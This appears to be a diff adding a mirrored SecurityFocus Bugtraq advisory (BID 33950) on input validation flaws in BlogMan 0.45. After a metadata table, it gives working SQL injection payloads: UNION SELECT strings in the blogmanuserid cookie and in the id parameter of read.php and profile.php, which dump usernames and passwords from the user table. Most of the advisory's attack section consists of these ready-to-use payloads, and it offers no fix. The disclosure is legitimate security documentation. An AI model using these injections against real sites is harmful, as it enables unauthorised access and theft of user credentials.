@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid33950<p><b><span style="font-size: 18pt;">BlogMan Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/33950/info">info</a><br><a href="http://www.securityfocus.com/bid/33950/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/33950/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/33950/solution">solution</a><br><a href="http://www.securityfocus.com/bid/33950/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				33950
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 02 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 04 2009 05:16PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Salvatore 'drosophila' Fresta
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Fahim A. Farook BlogMan  0.45<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit these issues.<br/><br/>The following example URIs and cookie data are available:<br/><br/>Name: blogmanuserid<br/>Content: -1' UNION ALL SELECT 1,CONCAT(UserName,char(58),UserPassword),3,4,5,6,7,8,9,10,11,12,13,14,15,16<br/>FROM user#<br/>Server: target_server (example: localhost)<br/>Path: /blogman/<br/><br/>http://www.example.com/path/read.php?id=-1'UNION ALL SELECT<br/>NULL,2,CONCAT(UserName,char(58),UserPassword),NULL,5,6,7 FROM user%23<br/><br/>http://www.example.com/path/profile.php?id=-1' UNION ALL SELECT<br/>1,CONCAT(UserName,char(58),UserPassword),3,4,5,6,7,8,9,10,11,12,13,14,15,16<br/>FROM user%23<br/><br/>Name: blogmanuserid<br/>Content: 1<br/>Server: target_server (example: localhost)<br/>Path: /blogman/<br/><br/>Name: blogmanuserid<br/>Content: -1' UNION ALL SELECT 2,NULL,3,4,5,6,7,8,9,10,11,12,13,14,15,1#<br/>Server: target_server (example: localhost)<br/>Path: /blogman/
+	
+		<ul>
+</ul>
+</div>
